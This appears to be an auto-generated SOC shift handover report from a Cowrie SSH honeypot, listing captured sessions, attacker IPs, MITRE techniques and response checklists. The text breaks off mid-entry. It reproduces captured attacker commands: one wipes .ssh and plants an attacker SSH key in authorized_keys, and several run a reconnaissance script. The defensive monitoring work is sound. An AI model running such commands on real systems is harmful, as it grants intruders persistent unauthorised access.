# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-11 |
| **Generated At** | 2026-03-11T20:32:08Z |
| **Shift Time** | 20:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **726** |
| Confirmed Threats | **456** |
| False Positives Filtered | **270** (37.2%) |
| Unique Attacker IPs | **138** |
| Countries of Origin | **32** |
| High Severity Cases | **121** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **605** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (99)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5e07f655cd08

| Field | Detail |
|---|---|
| **Source IP** | `83.111.76[.]194` |
| **First Seen** | 2026-03-11 01:54 |
| **Last Seen** | 2026-03-11 01:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 01:54:01` | `cowrie.session.connect` |
| `2026-03-11 01:54:01` | `cowrie.client.version` |
| `2026-03-11 01:54:01` | `cowrie.client.kex` |
| `2026-03-11 01:54:01` | `cowrie.login.success` |
| `2026-03-11 01:54:01` | `cowrie.session.params` |
| `2026-03-11 01:54:01` | `cowrie.command.input` |
| `2026-03-11 01:54:01` | `cowrie.command.failed` |
| `2026-03-11 01:54:01` | `cowrie.log.closed` |
| `2026-03-11 01:54:01` | `cowrie.session.params` |
| `2026-03-11 01:54:01` | `cowrie.command.input` |
| `2026-03-11 01:54:01` | `cowrie.session.file_download` |
| `2026-03-11 01:54:01` | `cowrie.log.closed` |
| `2026-03-11 01:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.111.76[.]194` to AbuseIPDB if not already reported
- [ ] Block `83.111.76[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301939f3fb4e

| Field | Detail |
|---|---|
| **Source IP** | `83.111.76[.]194` |
| **First Seen** | 2026-03-11 01:54 |
| **Last Seen** | 2026-03-11 01:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 01:54:03` | `cowrie.session.connect` |
| `2026-03-11 01:54:03` | `cowrie.client.version` |
| `2026-03-11 01:54:03` | `cowrie.client.kex` |
| `2026-03-11 01:54:03` | `cowrie.login.success` |
| `2026-03-11 01:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.111.76[.]194` to AbuseIPDB if not already reported
- [ ] Block `83.111.76[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca34b111b3cc

| Field | Detail |
|---|---|
| **Source IP** | `164.92.151[.]106` |
| **First Seen** | 2026-03-11 06:22 |
| **Last Seen** | 2026-03-11 06:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 06:22:54` | `cowrie.session.connect` |
| `2026-03-11 06:22:54` | `cowrie.client.version` |
| `2026-03-11 06:22:54` | `cowrie.client.kex` |
| `2026-03-11 06:22:57` | `cowrie.login.success` |
| `2026-03-11 06:22:59` | `cowrie.session.params` |
| `2026-03-11 06:22:59` | `cowrie.command.input` |
| `2026-03-11 06:22:59` | `cowrie.command.input` |
| `2026-03-11 06:22:59` | `cowrie.command.input` |
| `2026-03-11 06:22:59` | `cowrie.command.input` |
| `2026-03-11 06:23:01` | `cowrie.log.closed` |
| `2026-03-11 06:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.151[.]106` to AbuseIPDB if not already reported
- [ ] Block `164.92.151[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe492d7bfce

| Field | Detail |
|---|---|
| **Source IP** | `164.92.151[.]106` |
| **First Seen** | 2026-03-11 06:24 |
| **Last Seen** | 2026-03-11 06:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 06:24:15` | `cowrie.session.connect` |
| `2026-03-11 06:24:16` | `cowrie.client.version` |
| `2026-03-11 06:24:16` | `cowrie.client.kex` |
| `2026-03-11 06:24:21` | `cowrie.login.success` |
| `2026-03-11 06:24:22` | `cowrie.session.params` |
| `2026-03-11 06:24:22` | `cowrie.command.input` |
| `2026-03-11 06:24:22` | `cowrie.command.input` |
| `2026-03-11 06:24:22` | `cowrie.command.input` |
| `2026-03-11 06:24:22` | `cowrie.command.input` |
| `2026-03-11 06:24:23` | `cowrie.log.closed` |
| `2026-03-11 06:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.151[.]106` to AbuseIPDB if not already reported
- [ ] Block `164.92.151[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf90309ccaf6

| Field | Detail |
|---|---|
| **Source IP** | `164.92.151[.]106` |
| **First Seen** | 2026-03-11 06:25 |
| **Last Seen** | 2026-03-11 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 06:25:46` | `cowrie.session.connect` |
| `2026-03-11 06:25:46` | `cowrie.client.version` |
| `2026-03-11 06:25:46` | `cowrie.client.kex` |
| `2026-03-11 06:25:46` | `cowrie.login.success` |
| `2026-03-11 06:25:47` | `cowrie.session.params` |
| `2026-03-11 06:25:47` | `cowrie.command.input` |
| `2026-03-11 06:25:47` | `cowrie.command.input` |
| `2026-03-11 06:25:47` | `cowrie.command.input` |
| `2026-03-11 06:25:47` | `cowrie.command.input` |
| `2026-03-11 06:25:47` | `cowrie.log.closed` |
| `2026-03-11 06:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.151[.]106` to AbuseIPDB if not already reported
- [ ] Block `164.92.151[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae6d364fc77

| Field | Detail |
|---|---|
| **Source IP** | `139.59.45[.]9` |
| **First Seen** | 2026-03-11 10:20 |
| **Last Seen** | 2026-03-11 10:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 10:20:40` | `cowrie.session.connect` |
| `2026-03-11 10:20:41` | `cowrie.client.version` |
| `2026-03-11 10:20:41` | `cowrie.client.kex` |
| `2026-03-11 10:20:42` | `cowrie.login.success` |
| `2026-03-11 10:20:43` | `cowrie.session.params` |
| `2026-03-11 10:20:43` | `cowrie.command.input` |
| `2026-03-11 10:20:43` | `cowrie.command.input` |
| `2026-03-11 10:20:43` | `cowrie.command.input` |
| `2026-03-11 10:20:43` | `cowrie.command.input` |
| `2026-03-11 10:20:43` | `cowrie.log.closed` |
| `2026-03-11 10:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.45[.]9` to AbuseIPDB if not already reported
- [ ] Block `139.59.45[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4efb167ea99

| Field | Detail |
|---|---|
| **Source IP** | `139.59.45[.]9` |
| **First Seen** | 2026-03-11 10:21 |
| **Last Seen** | 2026-03-11 10:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 10:21:53` | `cowrie.session.connect` |
| `2026-03-11 10:21:53` | `cowrie.client.version` |
| `2026-03-11 10:21:53` | `cowrie.client.kex` |
| `2026-03-11 10:21:54` | `cowrie.login.success` |
| `2026-03-11 10:21:55` | `cowrie.session.params` |
| `2026-03-11 10:21:55` | `cowrie.command.input` |
| `2026-03-11 10:21:55` | `cowrie.command.input` |
| `2026-03-11 10:21:55` | `cowrie.command.input` |
| `2026-03-11 10:21:55` | `cowrie.command.input` |
| `2026-03-11 10:21:55` | `cowrie.log.closed` |
| `2026-03-11 10:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.45[.]9` to AbuseIPDB if not already reported
- [ ] Block `139.59.45[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ecd80933e2

| Field | Detail |
|---|---|
| **Source IP** | `209.38.30[.]136` |
| **First Seen** | 2026-03-11 12:46 |
| **Last Seen** | 2026-03-11 12:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 12:46:52` | `cowrie.session.connect` |
| `2026-03-11 12:46:52` | `cowrie.client.version` |
| `2026-03-11 12:46:52` | `cowrie.client.kex` |
| `2026-03-11 12:46:54` | `cowrie.login.success` |
| `2026-03-11 12:46:55` | `cowrie.session.params` |
| `2026-03-11 12:46:55` | `cowrie.command.input` |
| `2026-03-11 12:46:55` | `cowrie.command.input` |
| `2026-03-11 12:46:55` | `cowrie.command.input` |
| `2026-03-11 12:46:55` | `cowrie.command.input` |
| `2026-03-11 12:46:55` | `cowrie.log.closed` |
| `2026-03-11 12:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.30[.]136` to AbuseIPDB if not already reported
- [ ] Block `209.38.30[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc9616ef6b5

| Field | Detail |
|---|---|
| **Source IP** | `209.38.30[.]136` |
| **First Seen** | 2026-03-11 12:47 |
| **Last Seen** | 2026-03-11 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 12:47:45` | `cowrie.session.connect` |
| `2026-03-11 12:47:45` | `cowrie.client.version` |
| `2026-03-11 12:47:45` | `cowrie.client.kex` |
| `2026-03-11 12:47:47` | `cowrie.login.success` |
| `2026-03-11 12:47:48` | `cowrie.session.params` |
| `2026-03-11 12:47:48` | `cowrie.command.input` |
| `2026-03-11 12:47:48` | `cowrie.command.input` |
| `2026-03-11 12:47:48` | `cowrie.command.input` |
| `2026-03-11 12:47:48` | `cowrie.command.input` |
| `2026-03-11 12:47:48` | `cowrie.log.closed` |
| `2026-03-11 12:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.30[.]136` to AbuseIPDB if not already reported
- [ ] Block `209.38.30[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49667a72e3e6

| Field | Detail |
|---|---|
| **Source IP** | `209.38.30[.]136` |
| **First Seen** | 2026-03-11 12:48 |
| **Last Seen** | 2026-03-11 12:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 12:48:38` | `cowrie.session.connect` |
| `2026-03-11 12:48:39` | `cowrie.client.version` |
| `2026-03-11 12:48:39` | `cowrie.client.kex` |
| `2026-03-11 12:48:40` | `cowrie.login.success` |
| `2026-03-11 12:48:41` | `cowrie.session.params` |
| `2026-03-11 12:48:41` | `cowrie.command.input` |
| `2026-03-11 12:48:41` | `cowrie.command.input` |
| `2026-03-11 12:48:41` | `cowrie.command.input` |
| `2026-03-11 12:48:41` | `cowrie.command.input` |
| `2026-03-11 12:48:41` | `cowrie.log.closed` |
| `2026-03-11 12:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.30[.]136` to AbuseIPDB if not already reported
- [ ] Block `209.38.30[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0c5ec60de1

| Field | Detail |
|---|---|
| **Source IP** | `209.38.30[.]136` |
| **First Seen** | 2026-03-11 12:49 |
| **Last Seen** | 2026-03-11 12:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 12:49:32` | `cowrie.session.connect` |
| `2026-03-11 12:49:32` | `cowrie.client.version` |
| `2026-03-11 12:49:32` | `cowrie.client.kex` |
| `2026-03-11 12:49:33` | `cowrie.login.success` |
| `2026-03-11 12:49:34` | `cowrie.session.params` |
| `2026-03-11 12:49:34` | `cowrie.command.input` |
| `2026-03-11 12:49:34` | `cowrie.command.input` |
| `2026-03-11 12:49:34` | `cowrie.command.input` |
| `2026-03-11 12:49:34` | `cowrie.command.input` |
| `2026-03-11 12:49:35` | `cowrie.log.closed` |
| `2026-03-11 12:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.30[.]136` to AbuseIPDB if not already reported
- [ ] Block `209.38.30[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f4d2e235ca

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]201` |
| **First Seen** | 2026-03-11 13:09 |
| **Last Seen** | 2026-03-11 13:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 13:09:51` | `cowrie.session.connect` |
| `2026-03-11 13:09:51` | `cowrie.client.version` |
| `2026-03-11 13:09:52` | `cowrie.client.kex` |
| `2026-03-11 13:09:52` | `cowrie.login.success` |
| `2026-03-11 13:09:52` | `cowrie.direct-tcpip.request` |
| `2026-03-11 13:09:52` | `cowrie.direct-tcpip.data` |
| `2026-03-11 13:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]201` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7f812c2e59

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]201` |
| **First Seen** | 2026-03-11 13:20 |
| **Last Seen** | 2026-03-11 13:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 13:20:55` | `cowrie.session.connect` |
| `2026-03-11 13:20:55` | `cowrie.client.version` |
| `2026-03-11 13:20:55` | `cowrie.client.kex` |
| `2026-03-11 13:20:55` | `cowrie.login.success` |
| `2026-03-11 13:20:57` | `cowrie.direct-tcpip.request` |
| `2026-03-11 13:20:57` | `cowrie.direct-tcpip.data` |
| `2026-03-11 13:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]201` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb658b3fbbf

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]201` |
| **First Seen** | 2026-03-11 13:22 |
| **Last Seen** | 2026-03-11 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 13:22:23` | `cowrie.session.connect` |
| `2026-03-11 13:22:23` | `cowrie.client.version` |
| `2026-03-11 13:22:23` | `cowrie.client.kex` |
| `2026-03-11 13:22:23` | `cowrie.login.success` |
| `2026-03-11 13:22:24` | `cowrie.direct-tcpip.request` |
| `2026-03-11 13:22:24` | `cowrie.direct-tcpip.data` |
| `2026-03-11 13:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]201` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993d894bb68a

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]201` |
| **First Seen** | 2026-03-11 13:22 |
| **Last Seen** | 2026-03-11 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 13:22:43` | `cowrie.session.connect` |
| `2026-03-11 13:22:43` | `cowrie.client.version` |
| `2026-03-11 13:22:43` | `cowrie.client.kex` |
| `2026-03-11 13:22:44` | `cowrie.login.success` |
| `2026-03-11 13:22:44` | `cowrie.direct-tcpip.request` |
| `2026-03-11 13:22:45` | `cowrie.direct-tcpip.data` |
| `2026-03-11 13:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]201` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2edb4bc335

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:17 |
| **Last Seen** | 2026-03-11 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:17:02` | `cowrie.session.connect` |
| `2026-03-11 14:17:02` | `cowrie.client.version` |
| `2026-03-11 14:17:02` | `cowrie.client.kex` |
| `2026-03-11 14:17:03` | `cowrie.login.success` |
| `2026-03-11 14:17:03` | `cowrie.direct-tcpip.request` |
| `2026-03-11 14:17:03` | `cowrie.direct-tcpip.data` |
| `2026-03-11 14:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87a11ef3f39

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-11 14:17 |
| **Last Seen** | 2026-03-11 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 14:17:13` | `cowrie.session.connect` |
